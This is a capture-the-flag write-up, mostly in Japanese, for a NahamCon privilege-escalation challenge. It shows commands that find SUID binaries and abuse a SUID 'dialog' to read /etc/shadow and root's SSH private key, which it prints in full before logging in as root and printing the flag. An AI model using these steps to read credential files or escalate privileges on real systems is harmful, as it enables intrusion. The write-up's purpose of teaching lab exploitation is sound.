# Gossip:Miscellaneous:144pts
Ssshh, don't talk too loud! These conversations and gossip are only for us privileged users ;)  
Escalate your privileges and retrieve the flag out of root's home directory.  
There is intentionally no `/root/flag.txt` file present.  

**Connect with:**  
```
# Password is "userpass"
ssh -p 30120 user@challenge.nahamcon.com
```

# Solution
sshの接続先が渡される。  
どうやら権限昇格を行えばよいようだが、`/root/flag.txt`にフラグはないとされる。  
つまり任意コード実行やファイル一覧を取得する必要がある。  
まずはSUIDがついているものを見つける。  
```bash
$ ssh -p 30120 user@challenge.nahamcon.com
user@challenge.nahamcon.com's password:
~~~
user@gossip-0208532589e3354b-59f69d578d-s67pb:~$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
-rwxr-sr-x 1 root shadow 26776 Mar 24 01:43 /usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 22680 Mar 24 01:43 /usr/sbin/pam_extrausers_chkpwd
-rwsr-xr-x 1 root root 59976 Mar 14 08:59 /usr/bin/passwd
-rwsr-xr-x 1 root root 72072 Mar 14 08:59 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 47480 Feb 21 01:49 /usr/bin/mount
-rwxr-sr-x 1 root tty 22904 Feb 21 01:49 /usr/bin/wall
-rwsr-xr-x 1 root root 72712 Mar 14 08:59 /usr/bin/chfn
-rwsr-xr-x 1 root root 35192 Feb 21 01:49 /usr/bin/umount
-rwxr-sr-x 1 root shadow 72184 Mar 14 08:59 /usr/bin/chage
-rwsr-xr-x 1 root root 40496 Mar 14 08:59 /usr/bin/newgrp
-rwsr-xr-x 1 root root 55672 Feb 21 01:49 /usr/bin/su
-rwxr-sr-x 1 root shadow 23136 Mar 14 08:59 /usr/bin/expiry
-rwsr-xr-x 1 root root 44808 Mar 14 08:59 /usr/bin/chsh
-rwsr-sr-x 1 root root 260736 Jan  3 23:30 /usr/bin/dialog
-rwxr-sr-x 1 root _ssh 293304 Feb 25 23:30 /usr/bin/ssh-agent
-rwsr-xr-x 1 root root 338536 Feb 25 23:30 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 35112 Apr  1 17:02 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
```
ここから権限昇格に利用できそうなものを[GTFOBins](https://gtfobins.github.io/)で検索する。  
`dialog`が使えることがわかる。  
[https://gtfobins.github.io/gtfobins/dialog/](https://gtfobins.github.io/gtfobins/dialog/)  
`dialog --textbox "$LFILE" 0 0`で任意のファイルが読み取れるようだ。  
試しに`/etc/shadow`を読み取ってみる。  
```bash
user@gossip-0208532589e3354b-59f69d578d-s67pb:~$ cat /etc/shadow
cat: /etc/shadow: Permission denied
user@gossip-0208532589e3354b-59f69d578d-s67pb:~$ dialog --textbox "/etc/shadow" 0 0
        ┌───────────────────────────────────────────────────────────────────────────────────────────────────┐
        │ root:$y$j9T$bUYUBysm75fTsV/hoKHym1$YyijawyK29FuKbBh4crtAnJpKC0WZP9xxdkSqihULmD:19105:0:99999:7::: │
        │ daemon:*:19103:0:99999:7:::                                                                       │
        │ bin:*:19103:0:99999:7:::                                                                          │
        │ sys:*:19103:0:99999:7:::                                                                          │
        │ sync:*:19103:0:99999:7:::                                                                         │
        │ games:*:19103:0:99999:7:::                                                                        │
        │ man:*:19103:0:99999:7:::                                                                          │
        │ lp:*:19103:0:99999:7:::                                                                           │
        │ mail:*:19103:0:99999:7:::                                                                         │
        │ news:*:19103:0:99999:7:::                                                                         │
        │ uucp:*:19103:0:99999:7:::                                                                         │
        │ proxy:*:19103:0:99999:7:::                                                                        │
        │ www-data:*:19103:0:99999:7:::                                                                     │
        │ backup:*:19103:0:99999:7:::                                                                       │
        │ list:*:19103:0:99999:7:::                                                                         │
        │ irc:*:19103:0:99999:7:::                                                                          │
        │ gnats:*:19103:0:99999:7:::                                                                        │
        │ nobody:*:19103:0:99999:7:::                                                                       │
        │ _apt:*:19103:0:99999:7:::                                                                         │
        │ user:$y$j9T$b4e0TyOz8mQF2ikmKn6mh1$KLtovLtAr1jWnwOkgdCLL/b9TtgR/iasFrd.J.kvkbD:19105:0:99999:7::: │
        │ systemd-network:*:19105:0:99999:7:::                                                              │
        │ systemd-resolve:*:19105:0:99999:7:::                                                              │
        │ messagebus:*:19105:0:99999:7:::                                                                   │
        │ systemd-timesync:*:19105:0:99999:7:::                                                             │
        │ sshd:*:19105:0:99999:7:::                                                                         │
        ├───────────────────────────────────────────────────────────────────────────────────────────────────┤
        │                                             < EXIT >                                              │
        └───────────────────────────────────────────────────────────────────────────────────────────────────┘
```
これによりroot権限でのファイルの読み取りが可能となったが、フラグの場所がわからない。  
ここでrootのssh秘密鍵である`/root/.ssh/id_rsa`を読み取る方法を思いつく。  
```bash
user@gossip-0208532589e3354b-59f69d578d-s67pb:~$ dialog --textbox "/root/.ssh/id_rsa" 0 0
                      ┌────────────────────────────────────────────────────────────────────────┐
                      │ -----BEGIN OPENSSH PRIVATE KEY-----                                    │
                      │ b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn │
                      │ NhAAAAAwEAAQAAAYEAu7d12LaHxJ5soMXIvtJFsvT/r673Nc3BkMT7l2K+DAwrN4YCJS4E │
                      │ ouV3kJFY6NIwjXhzdQYVWxyvGFTTMPFx4EE7g+l5aLjsutLwbHokTigcmsgcXBAzHujNCw │
                      │ r/pWC0NvwmVs+1iSuBpBU58DU39Bs3/WcwadZUGb39gm3LdTvZWr+ZAJPldo3FCTKwakVl │
                      │ nVQYagnTts+ydi4F13AvaJY5NJ3+QVecSECuiKz4tjaabk0yY9XoRiZZqxQYaYxvwZ5xv1 │
                      │ F2JGc+f+tHhWrv/Pa1tpUrobGP2h5T+s1BfonQtKoz2U6vY0BPiq4luIu44gX1wgIwXOME │
                      │ WdnotZdlboY/W+ANLxv0IrpMPvtVOyWGI133z76Iy2ORH1KNc/Wt30CKWdQoa+0yGPOYGh │
                      │ iRZn6jSbPl2tt+tgLG3ZkvtnHS76AEEPXFGQ7DP0cKHc6AMoh7B+Cs+51i1HgvHby3d4MY │
                      │ 27f3SurbVWsgrj5dvmez7/xF7VQSnXqItmVGO+o1AAAFgG7MTLtuzEy7AAAAB3NzaC1yc2 │
                      │ EAAAGBALu3ddi2h8SebKDFyL7SRbL0/6+u9zXNwZDE+5divgwMKzeGAiUuBKLld5CRWOjS │
                      │ MI14c3UGFVscrxhU0zDxceBBO4PpeWi47LrS8Gx6JE4oHJrIHFwQMx7ozQsK/6VgtDb8Jl │
                      │ bPtYkrgaQVOfA1N/QbN/1nMGnWVBm9/YJty3U72Vq/mQCT5XaNxQkysGpFZZ1UGGoJ07bP │
                      │ snYuBddwL2iWOTSd/kFXnEhArois+LY2mm5NMmPV6EYmWasUGGmMb8Gecb9RdiRnPn/rR4 │
                      │ Vq7/z2tbaVK6Gxj9oeU/rNQX6J0LSqM9lOr2NAT4quJbiLuOIF9cICMFzjBFnZ6LWXZW6G │
                      │ P1vgDS8b9CK6TD77VTslhiNd98++iMtjkR9SjXP1rd9AilnUKGvtMhjzmBoYkWZ+o0mz5d │
                      │ rbfrYCxt2ZL7Zx0u+gBBD1xRkOwz9HCh3OgDKIewfgrPudYtR4Lx28t3eDGNu390rq21Vr │
                      │ IK4+Xb5ns+/8Re1UEp16iLZlRjvqNQAAAAMBAAEAAAGAVNq8qcbxHn8iyZY+hYvVt+yp/A │
                      │ eSdj7ZZhC1ThxznkyN6J5qL9ZagCxMXQxm7W++ROUTA+5JDxOrTsthYDl0aZPzTFDo8d7O │
                      │ HDGoPtEDwlS9gXY945vrD+jab0h8gYxySny28/0WqbgB9WMm+p+D+JOpPqI7r0wUXkKU6z │
                      │ WoiAkS2sPLbQht7KZvUBYayx8trO3Lz3s7ueKvYF6zg0ySEav+lftpaK4q1jpu6xeNogiS │
                      │ zJOW2KxkP/msBPqjgmrZf0w61cwA+xWbxdDRAUu2kVKIH3T7rizf9O8ZbALs3ONsiFB1Z0 │
                      │ 00ivq9bbt0IyGPQL78QEhEdN/b0BX2iPwm00AGUPLQoIOFl4+Tc4XcTzkp2U0CXPJtRoqB │
                      │ 78UJ5khDClNv80PXaTAefkR2bGesnhk3yDRbmimSYiLKLRLL+bpsNMka0sB346n+ZQVHIR │
                      │ q8OmZL8LuMHLzcRfVbl1qeRM5Ijj6XxE75Y2ID4N2oTUeceC1fRgvQKq1OFjpfDm6hAAAA │
                      ├────↓(+)───────────────────────────────────────────────────────67%─────┤
                      │                               < EXIT >                                 │
                      └────────────────────────────────────────────────────────────────────────┘
user@gossip-0208532589e3354b-59f69d578d-s67pb:~$ dialog --textbox "/root/.ssh/id_rsa" 0 0
                      ┌────↑(-)───────────────────────────────────────────────────────────────┐
                      │ Vq7/z2tbaVK6Gxj9oeU/rNQX6J0LSqM9lOr2NAT4quJbiLuOIF9cICMFzjBFnZ6LWXZW6G │
                      │ P1vgDS8b9CK6TD77VTslhiNd98++iMtjkR9SjXP1rd9AilnUKGvtMhjzmBoYkWZ+o0mz5d │
                      │ rbfrYCxt2ZL7Zx0u+gBBD1xRkOwz9HCh3OgDKIewfgrPudYtR4Lx28t3eDGNu390rq21Vr │
                      │ IK4+Xb5ns+/8Re1UEp16iLZlRjvqNQAAAAMBAAEAAAGAVNq8qcbxHn8iyZY+hYvVt+yp/A │
                      │ eSdj7ZZhC1ThxznkyN6J5qL9ZagCxMXQxm7W++ROUTA+5JDxOrTsthYDl0aZPzTFDo8d7O │
                      │ HDGoPtEDwlS9gXY945vrD+jab0h8gYxySny28/0WqbgB9WMm+p+D+JOpPqI7r0wUXkKU6z │
                      │ WoiAkS2sPLbQht7KZvUBYayx8trO3Lz3s7ueKvYF6zg0ySEav+lftpaK4q1jpu6xeNogiS │
                      │ zJOW2KxkP/msBPqjgmrZf0w61cwA+xWbxdDRAUu2kVKIH3T7rizf9O8ZbALs3ONsiFB1Z0 │
                      │ 00ivq9bbt0IyGPQL78QEhEdN/b0BX2iPwm00AGUPLQoIOFl4+Tc4XcTzkp2U0CXPJtRoqB │
                      │ 78UJ5khDClNv80PXaTAefkR2bGesnhk3yDRbmimSYiLKLRLL+bpsNMka0sB346n+ZQVHIR │
                      │ q8OmZL8LuMHLzcRfVbl1qeRM5Ijj6XxE75Y2ID4N2oTUeceC1fRgvQKq1OFjpfDm6hAAAA │
                      │ wQC+3yezOz10cj9Ggypq6j0Fg3xntOiD4PzrsEjCGxVeXC4i3bJaPPbv+q9xXNtPQkKtLp │
                      │ uNZyHe4S58Qhk+N37WLC7fcAxDpKDV2VDKkNwP/TQCLx0wZDiPgaPu/DU/QkkFVDVSQzNQ │
                      │ pvak9MSen0U3mAMNuyX/2fRZ6ynlYe5PFXj8Mqm3kpi+KiWNsghXUcuoR4MB6xMFyrjnZB │
                      │ a82P5J9Z4+5Ij9WZvW8kl2/KLamHVBTzfXvBtXWGwNR5aDE4kAAADBAOmiAfEyKchBbt89 │
                      │ KIFfK0IyxmTH9KeVwG+JFLaQuj92SqxGxRjFGKyI6aRDBYXn2aN8wKH/gGwUKet9thD6zo │
                      │ Fa7Hr0JdxcBsocWEkeBuutN/7HoO+efhK4UlIeAm1u13HTKqgUG8fwi8A23Gsui/jNCj8y │
                      │ RPF+l6BoQM502sZmOUDaH0HQ8/bkFEhTDSAIA/qojV6ItCgM6HrQXQXcgcaVu4yXiQC6zO │
                      │ oL18GFQiFznaRJeekwGkIw2WxB9sbwfQAAAMEAzbAdfMhZ1vZNWNS00j+Q31xSOoDtf4sn │
                      │ IucLB1RGnFcCRY+DvEE1ym764aqvHK9hBq0cw0RdIR58aec0szoWpGJqhYVTaApsXVnb6S │
                      │ IRCuNaigvs1EeZnXEgy+IiJIT6GAd/oG9KRTrck48tuWvSnotygW+hWz7pl8i3tqnSrGW6 │
                      │ 7JcumVB3rVP63sKXznKk23xKaKrlTZs8fzs4VxgYuvR9kAxAz6xC1bNWRtArkMmFn8ETwv │
                      │ 4cTOVaH95/MYYZAAAACmpvaG5AeHBzMTU=                                     │
                      │ -----END OPENSSH PRIVATE KEY-----                                      │
                      │                                                                        │
                      ├────────)───────────────────────────────────────────────────────100%────┤
                      │                               < EXIT >                                 │
                      └────────────────────────────────────────────────────────────────────────┘
```
鍵が取得できたためこれを利用してsshを試みる。  
```bash
$ cp gossip.key ~/.ssh/
$ chmod 600 ~/.ssh/gossip.key
$ ssh -p 30120 root@challenge.nahamcon.com -i ~/.ssh/gossip.key

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

root@gossip-0208532589e3354b-59f69d578d-s67pb:~# ls
get_flag
root@gossip-0208532589e3354b-59f69d578d-s67pb:~# ./get_flag
flag{73a084c47872dbe220b8230da936dfa6}
```
`/root/get_flag`を実行するとflagが得られた。  

## flag{73a084c47872dbe220b8230da936dfa6}